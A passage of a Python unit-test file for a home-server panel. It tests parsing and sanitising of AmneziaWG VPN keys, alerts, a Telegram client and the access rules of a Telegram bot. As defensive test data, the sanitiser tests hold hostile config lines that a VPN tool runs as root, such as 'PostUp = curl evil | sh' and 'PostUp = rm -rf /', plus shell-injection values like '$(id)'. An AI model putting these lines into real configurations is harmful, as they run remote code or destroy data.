"""Публикация, Telegram и VPN. На Windows сокет и awg недоступны, поэтому система подменяется."""
import base64
import http.server
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import zipfile
import zlib
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from malinnik import alerts, bot, sites, telegram, tunnel, vpn_helper  # noqa: E402
from malinnik.vpn_helper import KeyProblem, key_to_conf, lan_conflict, sanitize  # noqa: E402

PRIVATE = "a" * 43 + "="
PUBLIC = "b" * 43 + "="
SHARED = "c" * 43 + "="
GOOD_CONF = f"""[Interface]
PrivateKey = {PRIVATE}
Address = 10.8.1.2/32
DNS = 1.1.1.1, 1.0.0.1
MTU = 1280
Jc = 4
Jmin = 10
Jmax = 50
S1 = 86
S2 = 121
H1 = 1234
H2 = 5-10
I1 = <b 0xf6ab3267fa><r 10><t>

[Peer]
PublicKey = {PUBLIC}
PresharedKey = {SHARED}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.com:51820
PersistentKeepalive = 25
"""


def vpn_uri(payload: dict, compressed=True) -> str:
    raw = json.dumps(payload).encode()
    if compressed:
        raw = len(raw).to_bytes(4, "big") + zlib.compress(raw)
    return "vpn://" + base64.urlsafe_b64encode(raw).decode().rstrip("=")


def awg_key(config=GOOD_CONF, **extra) -> dict:
    last = {"config": config, **extra}
    return {
        "containers": [{"container": "amnezia-awg", "awg": {"last_config": json.dumps(last)}}],
        "dns1": "9.9.9.9", "dns2": "8.8.8.8",
    }


class KeyParsingTests(unittest.TestCase):
    def test_plain_conf_is_kept(self):
        clean = sanitize(key_to_conf(GOOD_CONF))
        self.assertEqual(clean["endpoint"], "vpn.example.com:51820")
        self.assertTrue(clean["full_tunnel"])
        self.assertEqual(clean["warnings"], [])
        self.assertIn(f"PrivateKey = {PRIVATE}", clean["conf"])
        self.assertIn("I1 = <b 0xf6ab3267fa><r 10><t>", clean["conf"])

    def test_vpn_uri_compressed_and_plain(self):
        for compressed in (True, False):
            with self.subTest(compressed=compressed):
                conf = key_to_conf(vpn_uri(awg_key(), compressed))
                self.assertIn(f"PublicKey = {PUBLIC}", conf)

    def test_vpn_uri_fills_dns_placeholders_and_mtu(self):
        config = GOOD_CONF.replace("DNS = 1.1.1.1, 1.0.0.1", "DNS = $PRIMARY_DNS, $SECONDARY_DNS").replace("MTU = 1280\n", "")
        conf = key_to_conf(vpn_uri(awg_key(config, mtu="1376")))
        self.assertIn("DNS = 9.9.9.9, 8.8.8.8", conf)
        self.assertIn("MTU = 1376", conf)
        sanitize(conf)

    def test_uri_prefix_is_not_stripped_as_character_set(self):
        # Распространённая ошибка: strip("vpn://") съедает и начало самого ключа.
        uri = vpn_uri(awg_key())
        self.assertIn("PublicKey", key_to_conf(uri))
        self.assertIn("PublicKey", key_to_conf("  " + uri + "\n"))

    def test_premium_key_without_config_explains(self):
        with self.assertRaisesRegex(KeyProblem, "платных"):
            key_to_conf(vpn_uri({"api_config": {"x": 1}, "containers": []}))

    def test_key_of_other_protocol(self):
        with self.assertRaisesRegex(KeyProblem, "нет настроек AmneziaWG"):
            key_to_conf(vpn_uri({"containers": [{"container": "amnezia-xray", "xray": {}}]}))

    def test_broken_uri(self):
        with self.assertRaisesRegex(KeyProblem, "повреждён"):
            key_to_conf("vpn://!!!not-base64!!!")

    def test_decompression_bomb_is_limited(self):
        raw = zlib.compress(b" " * (vpn_helper.MAX_DECOMPRESSED * 4))
        uri = "vpn://" + base64.urlsafe_b64encode(b"\0\0\0\0" + raw).decode()
        with self.assertRaises(KeyProblem):
            key_to_conf(uri)


class SanitizeSecurityTests(unittest.TestCase):
    """Значения этих параметров awg-quick выполняет через bash от root."""

    def test_command_keys_are_removed_in_any_case_and_spacing(self):
        for line in ("PostUp = curl evil | sh", "postup=id", "  POSTUP  =  id", "PreUp = id", "PreDown = id",
                     "PostDown = id", "SaveConfig = true", "Table = off"):
            with self.subTest(line):
                conf = GOOD_CONF.replace("[Peer]", f"{line}\n[Peer]")
                clean = sanitize(conf)
                self.assertNotIn(line.split("=")[0].strip().lower(), clean["conf"].lower())
                self.assertTrue(clean["warnings"])

    def test_command_keys_inside_peer_are_removed(self):
        clean = sanitize(GOOD_CONF + "PostUp = id\n")
        self.assertNotIn("postup", clean["conf"].lower())

    def test_shell_characters_in_values_are_rejected(self):
        for bad in ("$(id)", "`id`", "a;id", "a|id", "a&id", "a'b", 'a"b', "a\\b"):
            with self.subTest(bad):
                with self.assertRaisesRegex(KeyProblem, "Недопустимые"):
                    sanitize(GOOD_CONF.replace("Jc = 4", f"Jc = {bad}"))

    def test_clean_output_has_no_removed_commands_after_second_pass(self):
        clean = sanitize(GOOD_CONF.replace("[Peer]", "PostUp = id\n[Peer]"))
        again = sanitize(clean["conf"])
        self.assertEqual(again["warnings"], [])

    def test_trailing_command_in_comment_is_ignored(self):
        clean = sanitize(GOOD_CONF.replace("Jc = 4", "Jc = 4 # PostUp = id"))
        self.assertIn("Jc = 4\n", clean["conf"])
        self.assertNotIn("PostUp", clean["conf"])

    def test_required_fields(self):
        cases = {
            "приватного": GOOD_CONF.replace(f"PrivateKey = {PRIVATE}\n", ""),
            "ключа сервера": GOOD_CONF.replace(f"PublicKey = {PUBLIC}\n", ""),
            "адреса сервера": GOOD_CONF.replace("Endpoint = vpn.example.com:51820\n", ""),
            "AllowedIPs": GOOD_CONF.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", ""),
            "адреса \\(Address": GOOD_CONF.replace("Address = 10.8.1.2/32\n", ""),
            "разделы": "[Interface]\n",
        }
        for message, conf in cases.items():
            with self.subTest(message):
                with self.assertRaisesRegex(KeyProblem, message):
                    sanitize(conf)

    def test_invalid_values(self):
        for old, new in (("10.8.1.2/32", "10.8.1.999/32"), ("0.0.0.0/0, ::/0", "nonsense"),
                         ("vpn.example.com:51820", "vpn.example.com:99999"), ("MTU = 1280", "MTU = abc")):
            with self.subTest(new):
                with self.assertRaises(KeyProblem):
                    sanitize(GOOD_CONF.replace(old, new))

    def test_unknown_section(self):
        with self.assertRaises(KeyProblem):
            sanitize("[Evil]\nPrivateKey = x\n" + GOOD_CONF)

    def test_future_awg_params_pass(self):
        clean = sanitize(GOOD_CONF.replace("Jc = 4", "Jc = 4\nRekeyTimeout = 5\nContentPaddingAddition = 10"))
        self.assertIn("RekeyTimeout = 5", clean["conf"])


class LanSafetyTests(unittest.TestCase):
    def test_full_tunnel_is_safe(self):
        self.assertIsNone(lan_conflict(["0.0.0.0/0", "::/0"], ["192.168.1.0/24"]))

    def test_split_default_is_safe_because_lan_route_is_more_specific(self):
        self.assertIsNone(lan_conflict(["0.0.0.0/1", "128.0.0.0/1"], ["192.168.1.0/24"]))

    def test_same_or_narrower_network_is_rejected(self):
        self.assertIn("192.168.1.0/24", lan_conflict(["192.168.1.0/24"], ["192.168.1.0/24"]))
        self.assertIsNotNone(lan_conflict(["192.168.1.1/32"], ["192.168.1.0/24"]))

    def test_other_networks_are_fine(self):
        self.assertIsNone(lan_conflict(["10.0.0.0/8", "fd00::/64"], ["192.168.1.0/24"]))


class ServiceTests(unittest.TestCase):
    """Логика сервиса: файлы во временной папке, команды awg подменены."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="malinnik-vpn-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.iface = False
        self.commands = []
        conf_dir = os.path.join(self.tmp, "etc")

        def fake_run(args, timeout=60):
            self.commands.append(args)
            if args[:2] == ["awg-quick", "up"]:
                self.iface = True
            elif args[:2] == ["awg-quick", "down"]:
                self.iface = False
            stdout = ""
            if args[:1] == ["awg"] and args[-1] == "latest-handshakes":
                stdout = f"{PUBLIC}\t{int(time.time()) - 12}\n"
            if args[:1] == ["awg"] and args[-1] == "transfer":
                stdout = f"{PUBLIC}\t1000\t2000\n"
            if args[0] == "ip":
                stdout = json.dumps([{"dst": "192.168.1.0/24", "dev": "eth0"}, {"dst": "default"}])
            return subprocess.CompletedProcess(args, 0, stdout, "")

        patches = [
            mock.patch.object(vpn_helper, "CONF_DIR", conf_dir),
            mock.patch.object(vpn_helper, "CONF_PATH", os.path.join(conf_dir, "malinnik0.conf")),
            mock.patch.object(vpn_helper, "STATE_PATH", os.path.join(self.tmp, "state", "state.json")),
            mock.patch.object(vpn_helper, "run", fake_run),
            mock.patch.object(vpn_helper, "interface_up", lambda: self.iface),
            mock.patch.object(vpn_helper, "installed", lambda: True),
            mock.patch.object(vpn_helper.shutil, "which", lambda name: "/usr/sbin/resolvconf"),
        ]
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)
        self.service = vpn_helper.Service()

    def stored(self):
        with open(vpn_helper.CONF_PATH, encoding="utf-8") as f:
            return f.read()

    def test_status_never_contains_private_key(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.service.handle({"cmd": "up"})
        response = json.dumps(self.service.handle({"cmd": "status"}))
        self.assertNotIn(PRIVATE, response)
        self.assertNotIn(SHARED, response)

    def test_full_cycle(self):
        status = self.service.handle({"cmd": "status"})
        self.assertFalse(status["configured"])
        self.assertIn("error", self.service.handle({"cmd": "up"}))

        status = self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.assertTrue(status["configured"])
        self.assertFalse(status["up"], "импорт сам не включает VPN")

        status = self.service.handle({"cmd": "up"})
        self.assertTrue(status["up"])
        self.assertEqual(status["rx"], 1000)
        self.assertEqual(status["tx"], 2000)
        self.assertGreaterEqual(status["handshake_age"], 12)
        self.assertLess(status["handshake_age"], 30)

        status = self.service.handle({"cmd": "down"})
        self.assertFalse(status["up"])
        self.assertFalse(status["desired"])

        status = self.service.handle({"cmd": "delete"})
        self.assertFalse(status["configured"])
        self.assertFalse(os.path.exists(vpn_helper.CONF_PATH))

    def test_stored_config_has_no_commands(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF.replace("[Peer]", "PostUp = rm -rf /\n[Peer]")})
        self.assertNotIn("PostUp", self.stored())

    def test_bad_key_keeps_old_one(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        before = self.stored()
        self.assertIn("error", self.service.handle({"cmd": "import", "text": "мусор"}))
        self.assertEqual(self.stored(), before)

    def test_replacing_key_while_up_reconnects(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.service.handle({"cmd": "up"})
        self.commands.clear()
        new = GOOD_CONF.replace("vpn.example.com", "other.example.com")
        status = self.service.handle({"cmd": "import", "text": new})
        self.assertTrue(status["up"])
        self.assertEqual(status["endpoint"], "other.example.com:51820")
        self.assertEqual([c[1] for c in self.commands if c[0] == "awg-quick"], ["down", "up"])

    def test_key_cutting_off_home_network_is_rejected(self):
        conf = GOOD_CONF.replace("0.0.0.0/0, ::/0", "192.168.1.0/24")
        response = self.service.handle({"cmd": "import", "text": conf})
        self.assertIn("домашней сетью", response["error"])
        self.assertFalse(os.path.exists(vpn_helper.CONF_PATH))

    def test_dns_dropped_without_resolvconf(self):
        with mock.patch.object(vpn_helper.shutil, "which", lambda name: None):
            status = self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.assertNotIn("DNS", self.stored())
        self.assertTrue(any("resolvconf" in w for w in status["warnings"]))

    def test_failed_up_reports_error_and_stays_off(self):
        def failing(args, timeout=60):
            return subprocess.CompletedProcess(args, 1, "", "[#] ip link add\nRTNETLINK: операция не поддерживается\n")

        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        with mock.patch.object(vpn_helper, "run", failing):
            response = self.service.handle({"cmd": "up"})
        self.assertIn("RTNETLINK", response["error"])
        self.assertNotIn("[#]", response["error"])
        self.assertFalse(self.service.desired)

    def test_restores_after_reboot_and_retries(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.service.handle({"cmd": "up"})
        self.iface = False  # перезагрузка: интерфейса нет, а состояние сохранилось
        service = vpn_helper.Service()
        self.assertTrue(service.desired)
        service.keep_alive()
        self.assertTrue(self.iface)

    def test_keep_alive_records_problem_and_waits(self):
        self.service.handle({"cmd": "import", "text": GOOD_CONF})
        self.service.handle({"cmd": "up"})
        self.iface = False
        calls = []

        def failing(args, timeout=60):
            calls.append(args)
            return subprocess.CompletedProcess(args, 1, "", "нет сети")

        with mock.patch.object(vpn_helper, "run", failing):
            self.service.next_retry = 0
            self.service.keep_alive()
            self.service.keep_alive()
        self.assertEqual(len(calls), 1, "повтор только после паузы")
        self.assertIn("нет сети", self.service.status()["problem"])

    def test_unknown_command(self):
        self.assertIn("error", self.service.handle({"cmd": "rm -rf /"}))
        self.assertIn("error", self.service.handle({"cmd": "import", "text": 123}))
        self.assertIn("error", self.service.handle({"cmd": "import", "text": "x" * (vpn_helper.MAX_KEY + 1)}))


class AlertsTests(unittest.TestCase):
    def setUp(self):
        self.sent = []
        self.alerts = alerts.Alerts(self.sent.append)
        self.now = 1000.0
        patch = mock.patch.object(alerts.time, "time", lambda: self.now)
        patch.start()
        self.addCleanup(patch.stop)

    def check(self, state="running", desired="running", system=None, vpn=None, sites=None):
        site = {"id": "a", "name": "Сайт", "state": state, "desired": desired, "exit_code": 1}
        self.alerts.check([site] if sites is None else sites, system or {}, vpn or {})

    def test_short_restart_stays_silent(self):
        self.check("restarting")
        self.now += 10
        self.check("running")
        self.assertEqual(self.sent, [])

    def test_down_then_up_sends_one_message_each(self):
        self.check("crashed")
        self.now += alerts.SITE_DOWN_AFTER + 1
        self.check("crashed")
        self.check("crashed")
        self.assertEqual(len(self.sent), 1)
        self.assertIn("не работает", self.sent[0])
        self.check("running")
        self.check("running")
        self.assertEqual(len(self.sent), 2)
        self.assertIn("снова работает", self.sent[1])

    def test_user_stop_is_not_an_alert(self):
        self.check("stopped", desired="stopped")
        self.now += 1000
        self.check("stopped", desired="stopped")
        self.assertEqual(self.sent, [])

    def test_deleted_site_is_forgotten(self):
        self.check("crashed")
        self.now += 100
        self.check("crashed")
        self.sent.clear()
        self.check(sites=[])
        self.assertEqual(self.sent, [])
        self.assertEqual(self.alerts.active, set())

    def test_temperature_has_gap_between_thresholds(self):
        for temp, count in ((70, 0), (85, 1), (78, 1), (85, 1), (60, 2)):
            self.check(system={"temp": temp})
            self.assertEqual(len(self.sent), count, temp)

    def test_undervoltage_and_disk(self):
        self.check(system={"undervoltage": True, "disk_free": 10})
        self.assertEqual(len(self.sent), 2)
        self.check(system={"undervoltage": False, "disk_free": 10 ** 11})
        self.assertEqual(len(self.sent), 4)

    def test_vpn_silence(self):
        self.check(vpn={"up": True, "handshake_age": 20})
        self.assertEqual(self.sent, [])
        self.check(vpn={"up": True, "handshake_age": 400})
        self.assertIn("не отвечает", self.sent[-1])
        self.check(vpn={"up": True, "handshake_age": 5})
        self.assertIn("восстановилась", self.sent[-1])
        self.sent.clear()
        self.check(vpn={"up": False})
        self.assertEqual(self.sent, [])

    def test_vpn_problem_message(self):
        self.check(vpn={"problem": "VPN не поднялся: нет сети"})
        self.assertIn("нет сети", self.sent[0])


class FakeTelegram(http.server.BaseHTTPRequestHandler):
    log_message = lambda *_: None  # noqa: E731
    down = False
    conflict = False
    received = []
    updates = []
    methods = []

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length) or b"{}")
        _, bot, method = self.path.split("/")
        FakeTelegram.methods.append(method)
        if FakeTelegram.down:
            self.send_error(503)
            return
        if bot != f"bot{TOKEN}":
            self._reply(401, {"ok": False, "description": "Unauthorized"})
        elif method == "getUpdates":
            if FakeTelegram.conflict:
                self._reply(409, {"ok": False, "description": "Conflict"})
                return
            offset = body.get("offset", 0)
            fresh = [u for u in FakeTelegram.updates if u["update_id"] >= offset]
            if not fresh:
                time.sleep(0.05)  # настоящий Telegram держит запрос открытым
            self._reply(200, {"ok": True, "result": fresh})
        elif method == "setMyCommands":
            self._reply(200, {"ok": True, "result": True})
        elif body.get("chat_id") == "404":
            self._reply(400, {"ok": False, "description": "Bad Request: chat not found"})
        else:
            FakeTelegram.received.append(body)
            self._reply(200, {"ok": True, "result": {}})

    def _reply(self, status, data):
        raw = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)


TOKEN = "123456:" + "A" * 30


class TelegramTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="malinnik-tg-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        FakeTelegram.down = False
        FakeTelegram.conflict = False
        FakeTelegram.received = []
        FakeTelegram.updates = []
        FakeTelegram.methods = []
        self.server =http.server.ThreadingHTTPServer(("127.0.0.1", 0), FakeTelegram)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)
        patch = mock.patch.object(telegram, "API", f"http://127.0.0.1:{self.server.server_address[1]}")
        patch.start()
        self.addCleanup(patch.stop)
        self.tg = telegram.Telegram(self.tmp)
        self.addCleanup(self.tg.shutdown)

    def ready(self):
        self.tg.update({"token": TOKEN, "chat_id": "42", "enabled": True})

    def wait_for(self, predicate, timeout=5):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if predicate():
                return True
            time.sleep(0.05)
        return False

    def test_token_is_never_exposed(self):
        self.ready()
        self.assertNotIn(TOKEN, json.dumps(self.tg.to_json()))
        self.assertTrue(self.tg.to_json()["token_set"])

    def test_token_format_is_checked(self):
        for bad in ("abc", "123:short", f"{TOKEN}/../evil"):
            with self.assertRaises(telegram.TelegramError):
                self.tg.update({"token": bad})

    def test_cannot_enable_without_chat(self):
        with self.assertRaises(telegram.TelegramError):
            self.tg.update({"token": TOKEN, "enabled": True})
        self.assertFalse(self.tg.settings["enabled"])

    def test_settings_survive_restart(self):
        self.ready()
        again = telegram.Telegram(self.tmp)
        self.assertEqual(again.settings["chat_id"], "42")
        self.assertTrue(again.settings["enabled"])

    def test_new_token_resets_chat(self):
        self.ready()
        self.tg.update({"enabled": False})
        self.tg.update({"token": "999:" + "B" * 30})
        self.assertEqual(self.tg.settings["chat_id"], "")

    def test_find_chat_uses_latest_message(self):
        self.tg.update({"token": TOKEN})
        self.tg.run()
        with mock.patch.object(telegram, "FIND_CHAT_WAIT", 0.3):
            with self.assertRaisesRegex(telegram.TelegramError, "не получал"):
                self.tg.find_chat()
        FakeTelegram.updates = [
            {"update_id": 1, "message": {"chat": {"id": 1, "first_name": "Старый"}}},
            {"update_id": 2, "message": {"chat": {"id": 777, "first_name": "Новый"}}},
        ]
        self.assertEqual(self.tg.find_chat(), "Новый")
        self.assertEqual(self.tg.settings["chat_id"], "777")

    def test_find_chat_ignores_old_messages(self):
        self.tg.update({"token": TOKEN})
        self.tg.last_chat = (time.time() - telegram.CHAT_FRESH - 1, {"id": 666, "first_name": "Чужой"})
        with mock.patch.object(telegram, "FIND_CHAT_WAIT", 0.3):
            with self.assertRaises(telegram.TelegramError):
                self.tg.find_chat()
        self.assertEqual(self.tg.settings["chat_id"], "")

    def test_poller_hands_updates_once_and_advances_offset(self):
        self.tg.update({"token": TOKEN})
        seen = []
        self.tg.handler = seen.append
        self.tg.commands = [{"command": "help", "description": "x"}]
        FakeTelegram.updates = [{"update_id": 5, "message": {"chat": {"id": 1}, "text": "a"}},
                                {"update_id": 6, "message": {"chat": {"id": 1}, "text": "b"}}]
        self.tg.run()
        self.assertTrue(self.wait_for(lambda: len(seen) == 2))
        time.sleep(0.3)
        self.assertEqual([u["update_id"] for u in seen], [5, 6], "сообщения не должны приходить повторно")
        self.assertIn("setMyCommands", FakeTelegram.methods)

    def test_token_rejected_by_telegram_is_shown(self):
        self.tg.update({"token": "999:" + "Z" * 30})
        self.tg.run()
        self.assertTrue(self.wait_for(lambda: self.tg.to_json()["error"]))
        self.assertIn("не принял токен", self.tg.to_json()["error"])

    def test_second_panel_with_same_bot_is_explained(self):
        self.tg.update({"token": TOKEN})
        FakeTelegram.conflict = True
        self.tg.run()
        self.assertTrue(self.wait_for(lambda: self.tg.to_json()["error"]))
        self.assertIn("другая программа", self.tg.to_json()["error"])

    def test_send_test_and_errors_are_clear(self):
        self.ready()
        self.tg.send_test()
        self.assertEqual(FakeTelegram.received[-1]["chat_id"], "42")
        self.tg.update({"chat_id": "404"})
        with self.assertRaisesRegex(telegram.TelegramError, "Чат не найден"):
            self.tg.send_test()
        self.tg.settings["token"] = "1:" + "C" * 30
        with self.assertRaisesRegex(telegram.TelegramError, "не принял токен"):
            self.tg.send_test()

    def test_network_error_does_not_leak_token(self):
        self.ready()
        with mock.patch.object(telegram, "API", "http://127.0.0.1:1"):
            with self.assertRaises(telegram.TelegramError) as caught:
                self.tg.send_test()
        self.assertNotIn(TOKEN, str(caught.exception))

    def test_notify_is_silent_when_disabled(self):
        self.tg.run()
        self.tg.notify("нет")
        time.sleep(0.2)
        self.assertEqual(FakeTelegram.received, [])

    def test_queue_survives_outage_and_keeps_order(self):
        self.ready()
        self.tg.run()
        FakeTelegram.down = True
        self.tg.notify("первое")
        self.tg.notify("второе")
        self.assertTrue(self.wait_for(lambda: self.tg.last_error))
        self.assertEqual(FakeTelegram.received, [])
        FakeTelegram.down = False
        self.tg.wake.set()
        self.assertTrue(self.wait_for(lambda: len(FakeTelegram.received) == 2))
        self.assertEqual([m["text"] for m in FakeTelegram.received], ["первое", "второе"])
        self.assertIsNone(self.tg.last_error)

    def test_permanent_error_does_not_block_queue(self):
        self.tg.update({"token": TOKEN, "chat_id": "404", "enabled": True})
        self.tg.run()
        self.tg.notify("в никуда")
        self.assertTrue(self.wait_for(lambda: not self.tg.queue))


OWNER = 42


class FakeSite:
    def __init__(self, name):
        self.meta = {"name": name}
        self.run_log = mock.Mock()
        self.deploy_log = mock.Mock()
        self.run_log.tail.return_value = "строка журнала"
        self.deploy_log.tail.return_value = "строка установки"


def site_json(site_id="shop", name="Магазин", **extra):
    data = {
        "id": site_id, "name": name, "state": "running", "desired": "running", "kind": "node", "release": 2,
        "port": 8100, "effective_port": 8100, "uptime": 3700, "restarts": 0, "error": None, "cpu": 1.5, "rss": 5000000,
        "health": {"tcp": True, "code": 200, "ms": 12}, "published": False,
        "tunnel": {"state": "off", "url": None}, "deploy": {"active": False},
    }
    data.update(extra)
    return data


class BotTests(unittest.TestCase):
    """Логика команд без сети: ответы Telegram подменены и записываются."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="malinnik-bot-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.tg = telegram.Telegram(self.tmp)
        self.tg.settings.update(token=TOKEN, chat_id=str(OWNER), enabled=True)
        self.calls = []

        def fake_call(method, payload, timeout=15):
            self.calls.append((method, payload))
            return {}

        self.tg._call = fake_call
        self.sites = [site_json(), site_json("blog", "Блог", state="crashed", desired="running")]
        self.manager = mock.Mock()
        self.manager.telegram = self.tg
        self.manager.state.side_effect = lambda: {
            "system": {"temp": 48.2, "cpu": 12, "mem_used": 10 ** 9, "mem_total": 4 * 10 ** 9, "disk_free": 2 * 10 ** 10,
                       "uptime": 90000, "undervoltage": True},
            "sites": self.sites, "vpn": self.manager.vpn_status,
        }
        self.manager.vpn_status = {"available": True, "installed": True, "configured": True, "up": False,
                                   "desired": False, "endpoint": "vpn.example.com:51820"}
        self.manager.vpn_command.return_value = {}
        self.fake_sites = {"shop": FakeSite("Магазин"), "blog": FakeSite("Блог")}

        def get(site_id):
            if site_id not in self.fake_sites:
                raise bot.SiteError("Такого сайта нет.", 404)
            return self.fake_sites[site_id]

        self.manager.get.side_effect = get
        self.bot = bot.Bot(self.manager)

    def message(self, text, chat_id=OWNER, chat_type="private", age=0):
        return {"update_id": 1, "message": {"message_id": 7, "date": int(time.time()) - age, "text": text,
                                            "chat": {"id": chat_id, "type": chat_type}}}

    def press(self, data, chat_id=OWNER, chat_type="private"):
        return {"update_id": 2, "callback_query": {
            "id": "q", "data": data, "message": {"message_id": 7, "chat": {"id": chat_id, "type": chat_type}}}}

    def texts(self):
        return [p["text"] for m, p in self.calls if m in ("sendMessage", "editMessageText")]

    def last_buttons(self):
        for method, payload in reversed(self.calls):
            if method in ("sendMessage", "editMessageText") and "reply_markup" in payload:
                return [b for row in payload["reply_markup"].get("inline_keyboard", []) for b in row]
        return []

    def button_data(self, label):
        return next(b["callback_data"] for b in self.last_buttons() if b["text"] == label)

    # --- доступ ---

    def test_strangers_are_silently_ignored(self):
        for update in (self.message("/status", chat_id=666), self.message("/stop shop", chat_id=666),
                       self.press("do:restart:shop", chat_id=666)):
            self.bot.handle(update)
        self.assertEqual(self.calls, [], "посторонний не должен получить даже ответа")
        self.manager.action.assert_not_called()

    def test_group_chat_is_ignored_even_with_bound_id(self):
        self.tg.settings["chat_id"] = "-100"
        self.bot.handle(self.message("/restart shop", chat_id=-100, chat_type="supergroup"))
        self.bot.handle(self.press("do:restart:shop", chat_id=-100, chat_type="group"))
        self.assertEqual(self.calls, [])
        self.manager.action.assert_not_called()

    def test_disabled_bot_does_nothing(self):
        self.tg.settings["enabled"] = False
        self.bot.handle(self.message("/restart shop"))
        self.assertEqual(self.calls, [])
        self.manager.action.assert_not_called()

    def test_unbound_bot_does_nothing(self):
        self.tg.settings["chat_id"] = ""
        self.bot.handle(self.message("/status"))
        self.assertEqual(self.calls, [])

    def test_old_command_is_not_executed(self):
        self.bot.handle(self.message("/restart shop", age=bot.MAX_COMMAND_AGE + 5))
        self.manager.action.assert_not_called()
        self.assertIn("давно", self.texts()[0])

    # --- команды ---

    def test_status_overview(self):
        self.bot.handle(self.message("/status"))
        text = self.texts()[0]
        for part in ("48 °C", "Не хватает питания", "VPN: выключен", "Магазин: работает", "Блог: упал", "порт 8100"):
            self.assertIn(part, text)

    def test_keyboard_words_and_bot_suffix(self):
        self.bot.handle(self.message("Статус"))
        self.bot.handle(self.message("/status@my_bot"))
        self.assertEqual(len(self.texts()), 2)
        self.assertIn("VPN:", self.texts()[1])

    def test_start_shows_help_with_keyboard(self):
        self.bot.handle(self.message("/start"))
        method, payload = self.calls[0]
        self.assertIn("/restart", payload["text"])
        self.assertIn("keyboard", payload["reply_markup"])

    def test_unknown_command_and_plain_text(self):
        self.bot.handle(self.message("/rm -rf"))
        self.bot.handle(self.message("привет"))
        self.assertTrue(all("/help" in t for t in self.texts()))
        self.manager.action.assert_not_called()

    def test_restart_runs_immediately(self):
        self.bot.handle(self.message("/restart shop"))
        self.manager.action.assert_called_once_with("shop", "restart")

    def test_site_found_by_name_prefix_and_case(self):
        for arg in ("Магазин", "магазин", "маг", "SHOP", "sh"):
            self.manager.action.reset_mock()
            self.bot.handle(self.message(f"/restart {arg}"))
            self.manager.action.assert_called_once_with("shop", "restart")

    def test_ambiguous_and_missing_names(self):
        self.sites.append(site_json("shop2", "Магазин 2"))
        self.bot.handle(self.message("/restart маг"))
        self.assertIn("несколько", self.texts()[-1])
        self.bot.handle(self.message("/restart нетакого"))
        self.assertIn("нет", self.texts()[-1])
        self.manager.action.assert_not_called()

    def test_command_without_name_offers_buttons(self):
        self.bot.handle(self.message("/restart"))
        self.assertEqual(self.texts()[0], "Какой сайт перезапустить?")
        data = self.button_data("Магазин")
        self.manager.action.assert_not_called()
        self.bot.handle(self.press(data))
        self.manager.action.assert_called_once_with("shop", "restart")

    def test_site_error_is_reported(self):
        self.manager.action.side_effect = bot.SiteError("Сайт сейчас устанавливается.", 409)
        self.bot.handle(self.message("/restart shop"))
        self.assertIn("устанавливается", self.texts()[-1])

    # --- подтверждения ---

    def test_dangerous_actions_ask_first(self):
        for command, action in (("/stop shop", "stop"), ("/publish shop", "publish"), ("/unpublish shop", "unpublish")):
            with self.subTest(command):
                self.calls.clear()
                self.manager.action.reset_mock()
                self.bot.handle(self.message(command))
                self.manager.action.assert_not_called()
                self.bot.handle(self.press(self.button_data("Да")))
                self.manager.action.assert_called_once_with("shop", action)

    def test_cancel_does_nothing(self):
        self.bot.handle(self.message("/stop shop"))
        self.bot.handle(self.press(self.button_data("Отмена")))
        self.manager.action.assert_not_called()
        self.assertEqual(self.texts()[-1], "Отменено.")

    def test_confirmation_works_once(self):
        self.bot.handle(self.message("/stop shop"))
        yes = self.button_data("Да")
        self.bot.handle(self.press(yes))
        self.bot.handle(self.press(yes))
        self.manager.action.assert_called_once()
        self.assertIn("устарела", self.texts()[-1])

    def test_confirmation_expires(self):
        self.bot.handle(self.message("/stop shop"))
        yes = self.button_data("Да")
        with mock.patch.object(bot.time, "time", lambda: time.monotonic() + 10 ** 10):
            self.bot.handle(self.press(yes))
        self.manager.action.assert_not_called()

    def test_forged_button_cannot_skip_confirmation(self):
        for data in ("do:stop:shop", "do:publish:shop", "do:unpublish:shop", "do:vpn_up:", "yes:выдуманный"):
            self.bot.handle(self.press(data))
        self.manager.action.assert_not_called()
        self.manager.vpn_command.assert_not_called()

    def test_no_delete_command(self):
        self.bot.handle(self.message("/delete shop"))
        self.bot.handle(self.press("do:delete:shop"))
        self.manager.delete.assert_not_called()

    # --- карточка, журналы, VPN ---

    def test_card_shows_details_and_buttons(self):
        self.bot.handle(self.message("/site shop"))
        text = self.texts()[0]
        for part in ("Магазин", "Работает", "Node.js", "версия 2", "Ответ 200"):
            self.assertIn(part, text)
        labels = [b["text"] for b in self.last_buttons()]
        for label in ("Перезапустить", "Остановить", "Журнал сайта", "Открыть в интернете"):
            self.assertIn(label, labels)

    def test_card_of_published_site_has_link(self):
        self.sites[0] = site_json(published=True, tunnel={"state": "online", "url": "https://x.trycloudflare.com"})
        self.bot.handle(self.message("/site shop"))
        self.assertIn("https://x.trycloudflare.com", self.texts()[0])
        link = next(b for b in self.last_buttons() if b["text"] == "Открыть")
        self.assertEqual(link["url"], "https://x.trycloudflare.com")

    def test_stopped_site_offers_start(self):
